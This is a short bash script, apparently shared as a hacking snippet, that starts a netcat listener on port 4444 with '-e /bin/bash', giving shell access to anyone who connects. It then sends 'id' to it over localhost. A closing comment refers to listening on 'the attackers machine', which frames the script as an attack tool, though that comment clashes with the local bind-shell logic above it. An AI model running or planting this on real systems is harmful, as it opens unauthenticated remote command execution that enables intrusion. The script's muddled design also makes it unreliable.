#!/bin/bash

echo "a code from liosharl ........................"

# Set the listener port
PORT=4444

# Start a netcat listener in the background
nc -lvnp $PORT -e /bin/bash &

# Get the listener PID
LISTENER_PID=$!

# Wait for the listener to start
sleep 2

# Send a command to the listener
echo "id" | nc localhost $PORT

# Wait for the listener to exit
wait $LISTENER_PID

# use nc -lvnp 4444 to listen on the attackers machine 